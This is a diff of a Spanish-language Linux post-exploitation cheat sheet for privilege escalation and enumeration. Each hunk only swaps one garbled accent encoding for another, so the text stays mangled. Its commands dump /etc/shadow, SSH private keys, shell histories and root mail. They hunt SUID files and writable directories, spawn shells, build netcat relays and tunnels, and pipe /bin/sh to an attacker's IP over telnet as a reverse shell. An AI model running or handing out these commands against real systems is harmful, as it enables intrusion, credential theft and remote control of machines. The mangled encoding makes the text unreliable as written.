@@ -1,6 +1,6 @@
 Sistema Operativo
 
-QuÈ distribuciÛn es? QuÈ versiÛn?
+Qu√© distribuci√≥n es? Qu√© versi√≥n?
 cat /etc/issue
 cat /etc/*-release
 cat /etc/lsb-release
@@ -8,7 +8,7 @@ cat /etc/redhat-release
 lsb_release -a
 
 
-Cual es la versiÛn del Kernel? Es de 64 Bits?
+Cual es la versi√≥n del Kernel? Es de 64 Bits?
 cat /proc/version 
 uname -a
 uname -mrs
@@ -17,7 +17,7 @@ dmesg | grep Linux
 ls /boot | grep vmlinuz-
 
 
-QuÈ se puede obtener de las variables de entorno?
+Qu√© se puede obtener de las variables de entorno?
 cat /etc/profile
 cat /etc/environmen
 cat /etc/bashrc
@@ -40,7 +40,7 @@ lpinfo
 
 Aplicaciones y Servicios
 
-QuÈ servicios est·n corriendo? Cual tiene privilegios de usuario?
+Qu√© servicios est√°n corriendo? Cual tiene privilegios de usuario?
 ps aux
 ps -ef
 top
@@ -49,13 +49,13 @@ service --status-all
 chkconfig --list
 
 
-QuÈ servicios corren como root? Cuales son vulnerables?
+Qu√© servicios corren como root? Cuales son vulnerables?
 ?
 ps aux | grep root
 ps -ef | grep root
 
 
-QuÈ aplicaciones est·n instaladas? QuÈ versiÛn tienen? Est·n ejecut·ndose?
+Qu√© aplicaciones est√°n instaladas? Qu√© versi√≥n tienen? Est√°n ejecut√°ndose?
 ?
 ls -alh /usr/bin/
 ls -lah /sbin/
@@ -65,7 +65,7 @@ ls -lah /var/cache/apt/archivesO
 ls -lah /var/cache/yum/
 
 
-Alguna mala configuraciÛn en estos servicios? Hay plugins vulnerables?
+Alguna mala configuraci√≥n en estos servicios? Hay plugins vulnerables?
 ?
 1
 cat /etc/syslog.conf
@@ -94,7 +94,7 @@ cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 
 
-Usuarios y/o contraseÒas en texto claro?
+Usuarios y/o contrase√±as en texto claro?
 ?
 grep -i user [filename]
 grep -i pass [filename]
@@ -104,7 +104,7 @@ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 
 Comunicaciones y Redes
 
-Qu· adaptadores de red tiene el sistema? Conectado a otra red?
+Qu√° adaptadores de red tiene el sistema? Conectado a otra red?
 ?
 /sbin/ifconfig -a
 cat /etc/network/interfaces
@@ -121,7 +121,7 @@ dnsdomainname
 route -n
 
 
-QuÈ otros usuarios y m·quinas se comunican con el sistema?
+Qu√© otros usuarios y m√°quinas se comunican con el sistema?
 lsof -i
 lsof -i :80
 grep 80 /etc/services
@@ -134,13 +134,13 @@ last
 w
 
 
-Que hay en cachÈ? Direcciones IP y/o MAC
+Que hay en cach√©? Direcciones IP y/o MAC
 arp -e
 route
 /sbin/route -nee
 
 
-Es posible la inspecciÛn de paquetes (sniffing)? QuÈ se puede observar? Escuchar tr·fico en vivo
+Es posible la inspecci√≥n de paquetes (sniffing)? Qu√© se puede observar? Escuchar tr√°fico en vivo
 # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 
@@ -152,7 +152,7 @@ nc -lvp 4445    # Attacker. Ouput (Results)
 telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
 
 
-Es posible el redireccionamiento de puertos? Redireccionar e interactuar con el tr·fico desde otra vista
+Es posible el redireccionamiento de puertos? Redireccionar e interactuar con el tr√°fico desde otra vista
 # rinetd
 # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
  
@@ -165,20 +165,20 @@ ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Puerto Local
 ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Puerto Remoto
  
 # mknod backpipe p ; nc -l -p [puerto remoto] < backpipe  | nc [IP local] [puerto local] > backpipe
-mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # RetransmisiÛn de Puerto Port (Relay)
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Retransmisi√≥n de Puerto Port (Relay)
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Puerto 80 a 8080)
 mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Monitor de Proxy (Puerto 80 a 8080)
 
 
-Es posible hacer t˙nel? Enviar comandos localmente, remotamente
+Es posible hacer t√∫nel? Enviar comandos localmente, remotamente
 ssh -D 127.0.0.1:9050 -N [username]@[ip]
 proxychains ifconfig
 
 
 
-InformaciÛn Confidencial y Usuarios
+Informaci√≥n Confidencial y Usuarios
 
-Quien eres? Quien est· o ha estado logueado? Quien mas est· ahi? Quien puede hacer que?
+Quien eres? Quien est√° o ha estado logueado? Quien mas est√° ahi? Quien puede hacer que?
 ?
 id
 who
@@ -191,7 +191,7 @@ cat /etc/sudoers
 sudo -l    ### listar archivos sobre los que un usuario puede eplear sudo
 
 
-QuÈ archivos sensibles podemos encontrar?
+Qu√© archivos sensibles podemos encontrar?
 cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
@@ -203,26 +203,26 @@ ls -ahlR /root/
 ls -ahlR /home/
 
 
-Hay contraseÒas, scripts, bases de datos, archivos de configuraciÛn o de logs? Rutas por defecto y ubicaciones de contraseÒas
+Hay contrase√±as, scripts, bases de datos, archivos de configuraci√≥n o de logs? Rutas por defecto y ubicaciones de contrase√±as
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 
 
-Que ha estado haciendo el usuario? Hay alguna contraseÒa en texto claro? Que ha estado editando?
+Que ha estado haciendo el usuario? Hay alguna contrase√±a en texto claro? Que ha estado editando?
 cat ~/.bash_history
 cat ~/.nano_history
 cat ~/.atftp_history
 cat ~/.mysql_history
 
 
-QuÈ informaciÛn del usuario podemos encontrar?
+Qu√© informaci√≥n del usuario podemos encontrar?
 cat ~/.bashrc
 cat ~/.profile
 cat /var/mail/root
 cat /var/spool/mail/root
 
 
-Podemos encontrar informaciÛn de llave privada?
+Podemos encontrar informaci√≥n de llave privada?
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
@@ -242,7 +242,7 @@ cat /etc/ssh/ssh_host_key
 
 Sistemas de Archivos
 
-QuÈ podemos modificar en /etc/? Podemos reconfigurar un servicio?
+Qu√© podemos modificar en /etc/? Podemos reconfigurar un servicio?
 ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Todos
 ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Propietario
 ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Grupo
@@ -252,7 +252,7 @@ find /etc/ -readable -type f 2>/dev/null               # Todos
 find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Todos
 
 
-QuÈ podemos encontrar en /var/ ?
+Qu√© podemos encontrar en /var/ ?
 ls -lah /var/log
 ls -lah /var/mail
 ls -lah /var/spool
@@ -262,7 +262,7 @@ ls -lah /var/lib/mysql
 cat /var/lib/dhcp3/dhclient.leases
 
 
-Alguna configuraciÛn/archivo oculto en el sitio web? Alg˙n archivo de configuraciÛn con informaciÛn de bases de datos?
+Alguna configuraci√≥n/archivo oculto en el sitio web? Alg√∫n archivo de configuraci√≥n con informaci√≥n de bases de datos?
 ls -lahR /var/www/
 ls -lahR /srv/www/htdocs/
 ls -lahR /usr/local/www/apache22/data/
@@ -270,7 +270,7 @@ ls -lahR /opt/lampp/htdocs/
 ls -lahR /var/www/html/
 
 
-Algo en los archivos de logs? (PodrÌa ayudar con "Local File Includes"!)
+Algo en los archivos de logs? (Podr√≠a ayudar con "Local File Includes"!)
 cat /var/log/messages
 cat /var/log/secure
 cat /var/webmin/miniserv.log
@@ -286,23 +286,23 @@ echo os.system('/bin/bash')
 /bin/sh -i
 
 
-Como est·n montados los sistemas de archivos?
+Como est√°n montados los sistemas de archivos?
 mount
 df -h
 
 
-Hay alg˙n sistema de archivos sin montar?
+Hay alg√∫n sistema de archivos sin montar?
 cat /etc/fstab
 
 
 Que "Permisos Avanzados de Archivos Linux" son utilizados? Sticky bits, SUID & GUID
-find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Solo el dueÒo del directorio o del archivo puede renombrar o borrar aqui
-find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - ejecuciÛn como grupo, no como el usuario que lo iniciÛ.
-find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - ejecuciÛn como dueÒo, no como usuario que lo iniciÛ.
-find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID Û SUID
-for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Busca SGID Û SUID en lugares "comunes": /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin y en cualquier otro *bin,  (B˙squeda m·s r·pida)
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Solo el due√±o del directorio o del archivo puede renombrar o borrar aqui
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - ejecuci√≥n como grupo, no como el usuario que lo inici√≥.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - ejecuci√≥n como due√±o, no como usuario que lo inici√≥.
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID √≥ SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Busca SGID √≥ SUID en lugares "comunes": /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin y en cualquier otro *bin,  (B√∫squeda m√°s r√°pida)
  
-# Buscar iniciando en la raÌz (/), SGID Û SUID, no enlaces simbÛlicos, solo 3 niveles de profundidad, lista con m·s detalles y oculta errores de acceso (permission denied).
+# Buscar iniciando en la ra√≠z (/), SGID √≥ SUID, no enlaces simb√≥licos, solo 3 niveles de profundidad, lista con m√°s detalles y oculta errores de acceso (permission denied).
 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 
 
@@ -310,26 +310,26 @@ En donde se puede escribir y desde donde se puede ejecutar? Unos cuantos lugares
 find / -writable -type d 2>/dev/null     # directorios con escritura para todos
 find / -perm -222 -type d 2>/dev/null    # directorios con escritura para todos
 find / -perm -o+w -type d 2>/dev/null    # directorios con escritura para todos
-find / -perm -o+x -type d 2>/dev/null    # directorios con ejecuciÛn para todos
-find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # ejecuciÛn & escritura
+find / -perm -o+x -type d 2>/dev/null    # directorios con ejecuci√≥n para todos
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # ejecuci√≥n & escritura
 
 
-Hay alg˙n archivo "problema"? Archivos con usuario "nobody"?
+Hay alg√∫n archivo "problema"? Archivos con usuario "nobody"?
 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # Archivos con escritura para todos
-find /dir -xdev \( -nouser -o -nogroup \) -print   # Archivos sin dueÒo
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Archivos sin due√±o
 
 
 
-B˙squeda & PreparaciÛn de CÛdigos para Exploits
+B√∫squeda & Preparaci√≥n de C√≥digos para Exploits
 
-QuÈ herramientas/lenguajes de desarrollo est·n soportadas/instaladas?
+Qu√© herramientas/lenguajes de desarrollo est√°n soportadas/instaladas?
 find / -name perl*
 find / -name python*
 find / -name gcc*
 find / -name cc
 
 
-CÛmo se pueden cargar los archivos?
+C√≥mo se pueden cargar los archivos?
 find / -name wget
 find / -name nc*
 find / -name netcat*
